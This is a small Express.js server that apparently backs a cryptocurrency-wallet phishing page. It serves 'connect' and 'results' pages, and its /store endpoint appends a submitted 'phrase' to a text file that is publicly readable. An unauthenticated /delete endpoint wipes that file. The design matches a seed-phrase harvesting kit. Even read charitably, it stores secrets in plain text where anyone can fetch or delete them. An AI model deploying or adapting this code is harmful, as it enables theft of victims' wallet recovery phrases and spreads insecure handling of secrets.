const express = require('express')
const app = express()
const port = 5000
var path = require('path');
var bodyParser = require('body-parser')
const fs = require('fs');



app.use(bodyParser.urlencoded({ extended: false }))

// parse application/json
app.use(bodyParser.json())




app.use(express.static( path.join(__dirname, 'public')));
app.get('/', (req, res) => {
    var options = {root: __dirname};
  res.sendFile('public/index.html', options)
})
app.get('/connect', (req, res) => {
    var options = {root: __dirname};
  res.sendFile('public/connect.html', options)
})

app.get('/results', (req, res) => {
    var options = {root: __dirname};
  res.sendFile('public/results.html', options)
})

app.post('/store', (req, res) => {
    //console.log(req.body)
    let {phrase} = req.body 
    phrase+= '\n'
    const filePath = 'public/results.txt';
   const append =  fs.appendFile(filePath, phrase, (err) => {
        if (err) {
          console.error('An error occurred while appending to the file:', err);
          return;
        }
        console.log('Content has been appended to the file successfully.');
        res.status(200).json("Great")
      });

    
})
app.post('/delete', (req, res) => {
    //console.log(req.body)
    
    
    const filePath = 'public/results.txt';
    fs.unlink(filePath, (err) => {
        if (err) {
          console.error('An error occurred while deleting the file:', err);
          return;
        }
        console.log('File has been deleted successfully.');
        res.sendStatus(200)
      });

    
})



app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})